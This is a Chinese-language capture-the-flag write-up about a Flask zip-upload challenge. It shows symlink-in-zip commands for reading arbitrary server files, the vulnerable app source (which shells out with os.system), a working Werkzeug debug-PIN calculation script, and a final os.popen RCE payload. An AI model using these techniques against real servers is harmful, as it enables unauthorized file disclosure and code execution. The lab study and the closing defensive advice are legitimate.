## 考点

后端使用系统调用进行文件解压操作从而通过软连接进行任意文件读，flask框架下debug模式进行rce。

## 工具

python环境

## 步骤

提供了一个能对压缩包进行解压的功能，上传软链接文件会在解压时候软链接到服务端对应文件从而进行任意文件读。

```shell
ln -s $you_want_do_read $gen_file
zip -y $gen_file.zip $gen_file
```

读到源码`/opt/app/app.py`:

```python
# -*- coding: utf-8 -*-
from flask import Flask, render_template,redirect, url_for, request, Response
import uuid
import random
from werkzeug.utils import secure_filename
import os
random.seed(uuid.getnode())
app = Flask(__name__)
app.config['SECRET_KEY'] = str(random.random()*100)
app.config['UPLOAD_FOLDER'] = './uploads'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024
ALLOWED_EXTENSIONS = set(['zip'])

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS


@app.route('/', methods=['GET','POST'])
def index():
    error = request.args.get('error', '')
    if error == '1':
        return render_template('index.html', forbidden=1)
    return render_template('index.html')


@app.route('/upload', methods=['POST','GET'])
def upload_file():
    if 'the_file' not in request.files:
        return redirect(url_for('index'))
    file = request.files['the_file']
    if file.filename == '':
        return redirect(url_for('index'))
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        if(os.path.exists(file_save_path)):
            return 'This file already exists'
        file.save(file_save_path)
    else:
        return 'This file is not a zipfile'

    extract_path = file_save_path + '_'
    file = ''
    os.system('unzip -n ' + file_save_path + ' -d '+ extract_path)
    dir_list = os.popen('ls ' + extract_path, 'r').read()
    print(dir_list.split())
    for dir in dir_list.split():
        if '../' in dir:
            os.system('rm -rf ' + extract_path)
            os.remove(file_save_path)
            return redirect(url_for('index', error=1))
        file += open(extract_path + '/' + dir, 'r').read()
    os.system('rm -rf ' + extract_path)
    os.remove(file_save_path)

    return Response(file)


if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True, port=10008)
```

注意到开启了debug模式，我们想办法产生报错进入报错界面，方法很多，简单列举几种：

- 注意到这段代码对ls的结果进行了split，我们可以传入文件名带空格的文件，使得读取失败：

  ```python
      for dir in dir_list.split():
          if '../' in dir:
              os.system('rm -rf ' + extract_path)
              os.remove(file_save_path)
              return redirect(url_for('index', error=1))
          file += open(extract_path + '/' + dir, 'r').read()
  ```

- 软链接一个服务端不存在的文件产生报错

- 软链接`/flag`爆`Permission denied`错（大部分爆的这个错）

进入debug界面后，我们只需要拿到pin码就可以任意执行python代码了，而pin码是可以通过读取相应文件配置计算出来的，可以参考这篇博客：[Flask渗透01：debug模式中的RCE | Akiba's blog (anzu.link)](https://anzu.link/pages/204626/#pin码生成)

- `username` 
- `modname`
- `getattr(app, '__name__', getattr(app.__class__, '__name__'))`
- `getattr(mod, '__file__', None)`
- `str(uuid.getnode())`
-  `machine_id`

计算exp如下：

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'friday'# username    
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]
mac = '02:42:ac:11:00:04'
temp = [int(i,16) for i in mac.split(':')]
mac = int(''.join([bin(i).replace('0b','').zfill(8) for i in temp]), 2)

print(mac)
private_bits = [
    str(mac),# str(uuid.getnode()),  /sys/class/net/ens33/address
    '72156c4a72960ef552cb8b2cc9438891'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
# 502-646-014
```

算得pin码，成功rce：

```python
import os
os.popen("/readflag").read()
```

## 总结

进行解压操作请使用zipfile库进行解压，不要使用系统调用，另外用debug模式来进行release属于纯脑瘫行为。
